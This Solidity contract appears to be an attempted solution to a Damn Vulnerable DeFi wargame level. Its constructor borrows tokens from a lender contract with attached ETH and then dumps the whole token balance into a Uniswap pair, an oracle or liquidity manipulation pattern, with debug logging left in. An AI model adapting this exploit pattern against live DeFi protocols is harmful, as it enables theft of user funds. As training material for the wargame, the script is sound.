// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract Taker {
    address public immutable uniswapPair;
    DamnValuableToken public immutable token;
    address lender;
    
    constructor(address tokenAddress, address uniswapPairAddress, address _lender) payable {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
        lender = _lender;

        console.log(msg.value / 10 ** 18);

        (bool success1, bytes memory result1) = lender.call{value: msg.value}(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                10 * 10 ** 18,
                address(this)
            )
        );
        console.log(success1);

        token.approve(uniswapPair, token.balanceOf(address(this)));

        (bool success2, bytes memory result2) = uniswapPair.call(
        abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            token.balanceOf(address(this)),
            0,
            block.timestamp * 2
            )
        );
        console.log(success2);
    }
} 
